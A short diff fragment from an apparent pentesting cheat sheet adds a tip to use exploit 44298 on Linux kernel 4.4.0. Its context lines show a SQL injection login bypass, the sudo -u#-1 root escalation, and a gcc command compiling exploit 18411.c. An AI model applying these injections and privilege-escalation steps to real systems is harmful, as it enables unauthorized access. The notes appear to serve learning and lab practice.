@@ -217,7 +217,10 @@ gabriel' or 1=1 LIMIT 1;#
 sudo -u#-1 /bin/bash
 ```
 
-
+### If your Linux Kernel is 4.4.0-whatever
+```bash
+just use 44298. its already compiled
+```
 **THIS IS WORK IN PROGRESS**
 
 gcc -m32 -Wl,--hash-style=both -o exploit 18411.c 
